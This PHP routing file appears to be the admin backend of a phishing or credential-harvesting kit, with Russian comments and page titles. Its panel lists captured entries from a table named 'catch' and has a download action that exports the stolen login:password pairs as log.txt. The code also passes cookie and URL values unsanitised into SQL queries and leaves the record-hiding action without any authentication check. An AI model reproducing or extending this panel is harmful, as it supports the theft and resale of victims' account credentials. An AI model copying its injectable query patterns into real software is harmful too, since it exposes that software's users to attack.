<?php

	defined('YProtect') or die('Вы не имеете доступа к этому файлу.');
	
	if($config['https'] == True AND $_SERVER['SERVER_PORT'] != '443') {
		header('Location: https://'.$config['domain'].$_SERVER['REQUEST_URI']);
	}
	
	// ================================================================= //
	// ===================== [ ОСНОВНЫЕ СТРАНИЦЫ ] ===================== // 
	// ================================================================= //
	
	if(preg_match('/'.str_replace('/', '\/', siteURL()).'\/index.php\?act=invite&code=.+/', userCurrentURL())) {
		$invite = substr(userCurrentURL(), mb_strlen(siteURL())+27);
		setcookie('invite', $invite, time()+3600*30);
		
		header('Location: '.siteURL());
	} elseif(userCurrentURL() == siteURL().'/' OR strpos(userCurrentURL(), 'index.php')) {
		require_once $_SERVER['DOCUMENT_ROOT'].'/core/pages/index.php';
	} elseif(userCurrentURL() == siteURL().'/authorize' OR strpos(userCurrentURL(), 'authorize')) {
		require_once $_SERVER['DOCUMENT_ROOT'].'/core/pages/auth.php';
	} elseif(preg_match('/'.str_replace('/', '\/', siteURL()).'\/apanel\?act=hide&id=\d+/', userCurrentURL())) {
		$id = substr(userCurrentURL(), mb_strlen(siteURL())+20);
		$result = mysql_query("SELECT `id` FROM `catch` WHERE `id` = '$id'");
		if(mysql_num_rows($result) > 0) {
			$query = "UPDATE `catch` SET `hide` = '1' WHERE `id` = '$id'";
			$res = mysql_query($query) or die (mysql_error());
			header('Location: '. $_SERVER['HTTP_REFERER']);
		} else {
			header('Location: '.siteURL().'/apanel');
		}
	} elseif(preg_match('/'.str_replace('/', '\/', siteURL()).'\/apanel\?act=show&id=\d+/', userCurrentURL())) {
		if(isset($_COOKIE['uid']) AND isset($_COOKIE['code']) AND isset($_COOKIE['hash'])) {
		$user = mysql_fetch_assoc(mysql_query("SELECT `id`, `code` FROM `users` WHERE `id` = '".$_COOKIE['uid']."'"));
		$code = md5($user['code']);
		$hash = md5($_SERVER['REMOTE_ADDR'].':'.$user['id']);
		
		if($_COOKIE['uid'] != $user['id'] OR $_COOKIE['code'] != $code OR $_COOKIE['hash'] != $hash) {
			header('Location: '.siteURL().'/apanel?act=auth');
		} else {
			$id = substr(userCurrentURL(), mb_strlen(siteURL())+20);
			$result = mysql_query("SELECT `id` FROM `catch` WHERE `id` = '$id'");
			if(mysql_num_rows($result) > 0) {
				$query = "UPDATE `catch` SET `hide` = '0' WHERE `id` = '$id'";
				$res = mysql_query($query) or die (mysql_error());
				header('Location: '. $_SERVER['HTTP_REFERER']);
			} else {
				header('Location: '.siteURL().'/apanel');
			}
		}
		} else {
			setcookie('uid', NULL, time()-3600*7);
			setcookie('code', NULL, time()-3600*7);
			setcookie('hash', NULL, time()-3600*7);
			header('Location: '.siteURL().'/apanel?act=auth');
		}
	} elseif(preg_match('/'.str_replace('/', '\/', siteURL()).'\/apanel\?act=info&id=\d+/', userCurrentURL())) {
		if(isset($_COOKIE['uid']) AND isset($_COOKIE['code']) AND isset($_COOKIE['hash'])) {
			$user = mysql_fetch_assoc(mysql_query("SELECT `id`, `code` FROM `users` WHERE `id` = '".$_COOKIE['uid']."'"));
			$code = md5($user['code']);
			$hash = md5($_SERVER['REMOTE_ADDR'].':'.$user['id']);
			
			if($_COOKIE['uid'] != $user['id'] OR $_COOKIE['code'] != $code OR $_COOKIE['hash'] != $hash) {
				header('Location: '.siteURL().'/apanel?act=auth');
			} else {
				$id = substr(userCurrentURL(), mb_strlen(siteURL())+20);
				$result = mysql_query("SELECT `id` FROM `catch` WHERE `id` = '$id'");
				if(mysql_num_rows($result) > 0) {
					$page = Array(
						'title' 		=> 'Панель управления :: Подробности',
						'favicon'		=> siteURL().'/core/themes/'.$config['theme'].'/favicon.ico'
					);
					
					require_once $_SERVER['DOCUMENT_ROOT'].'/core/pages/apanel-info.php';
				} else {
					header('Location: '.siteURL().'/apanel');
				}
			}
		} else {
			setcookie('uid', NULL, time()-3600*7);
			setcookie('code', NULL, time()-3600*7);
			setcookie('hash', NULL, time()-3600*7);
			header('Location: '.siteURL().'/apanel?act=auth');
		}
	} elseif(preg_match('/'.str_replace('/', '\/', siteURL()).'\/apanel\?act=download/', userCurrentURL())) {
		if(isset($_COOKIE['uid']) AND isset($_COOKIE['code']) AND isset($_COOKIE['hash'])) {
			$user = mysql_fetch_assoc(mysql_query("SELECT `id`, `code` FROM `users` WHERE `id` = '".$_COOKIE['uid']."'"));
			$code = md5($user['code']);
			$hash = md5($_SERVER['REMOTE_ADDR'].':'.$user['id']);
			
			if($_COOKIE['uid'] != $user['id'] OR $_COOKIE['code'] != $code OR $_COOKIE['hash'] != $hash) {
				header('Location: '.siteURL().'/apanel?act=auth');
			} else {
				$GET = mysql_query("SELECT * FROM `catch` WHERE `hide` = '0' ORDER BY `id` DESC");
				if(mysql_num_rows($GET) > 0) {
					$name = md5(rand(100000,999999));
					$dir = 'core/data/'.$name.'.txt';
					
					while($row = mysql_fetch_assoc($GET)) {
						$text = $row['login'].':'.$row['password'].''. PHP_EOL;
						
						$fp = fopen($dir, 'a');
						fwrite($fp, $text);
						fclose($fp);
					}
					
					header("Content-Type: application/octet-stream");
					header("Accept-Ranges: bytes");
					header("Content-Length: ".filesize($dir));
					header("Content-Disposition: attachment; filename=log.txt");
					readfile($dir);
					unlink($dir);
				}
			}
		} else {
			setcookie('uid', NULL, time()-3600*7);
			setcookie('code', NULL, time()-3600*7);
			setcookie('hash', NULL, time()-3600*7);
			header('Location: '.siteURL().'/apanel?act=auth');
		}
	} elseif(preg_match('/'.str_replace('/', '\/', siteURL()).'\/apanel\?act=logout&hash=.+/', userCurrentURL())) {
		if(isset($_COOKIE['uid']) AND isset($_COOKIE['code']) AND isset($_COOKIE['hash'])) {
			$linkHash = substr(userCurrentURL(), mb_strlen(siteURL())+24);
				$user = mysql_fetch_assoc(mysql_query("SELECT `id`, `code` FROM `users` WHERE `id` = '".$_COOKIE['uid']."'"));
				$code = md5($user['code']);
				$hash = md5($_SERVER['REMOTE_ADDR'].':'.$user['id']);
				
				if($_COOKIE['uid'] != $user['id'] OR $_COOKIE['code'] != $code OR $_COOKIE['hash'] != $hash) {
					header('Location: '.siteURL().'/apanel?act=auth');
				} else {
					if($linkHash == $_COOKIE['hash']) {
						setcookie('uid', NULL, time()-3600*7);
						setcookie('code', NULL, time()-3600*7);
						setcookie('hash', NULL, time()-3600*7);
						
						header('Location: '.siteURL().'/apanel?act=auth');
					} else {
						header('Location: '.siteURL().'/apanel');
					}
				}
		} else {
			header('Location: '.siteURL().'/apanel?act=auth');
		}
	} elseif(userCurrentURL() == siteURL().'/apanel?act=auth' OR strpos(userCurrentURL(), 'apanel?act=auth')) {
		$page = Array(
			'title' 		=> 'Панель управления :: Авторизация',
		);
		require_once $_SERVER['DOCUMENT_ROOT'].'/core/pages/apanel-auth.php';
	} elseif(userCurrentURL() == siteURL().'/apanel?act=settings' OR strpos(userCurrentURL(), 'apanel?act=settings')) {
		$page = Array(
			'title' 		=> 'Панель управления :: Настройки',
		);
		require_once $_SERVER['DOCUMENT_ROOT'].'/core/pages/apanel-settings.php';
	} elseif(userCurrentURL() == siteURL().'/apanel?act=edit' OR strpos(userCurrentURL(), 'apanel?act=edit')) {
		$page = Array(
			'title' 		=> 'Панель управления :: Настройки аккаунта',
		);
		require_once $_SERVER['DOCUMENT_ROOT'].'/core/pages/apanel-edit.php';
	} elseif(userCurrentURL() == siteURL().'/apanel?act=stats' OR strpos(userCurrentURL(), 'apanel?act=stats')) {
		$page = Array(
			'title' 		=> 'Панель управления :: Статистика',
		);
		require_once $_SERVER['DOCUMENT_ROOT'].'/core/pages/apanel-stats.php';
	} elseif(userCurrentURL() == siteURL().'/apanel' OR strpos(userCurrentURL(), 'apanel')) {
		$page = Array(
			'title' 		=> 'Панель управления :: Главная',
		);
		require_once $_SERVER['DOCUMENT_ROOT'].'/core/pages/apanel-main.php';
	} else {
		header('Location: '.siteURL());
	}

?>
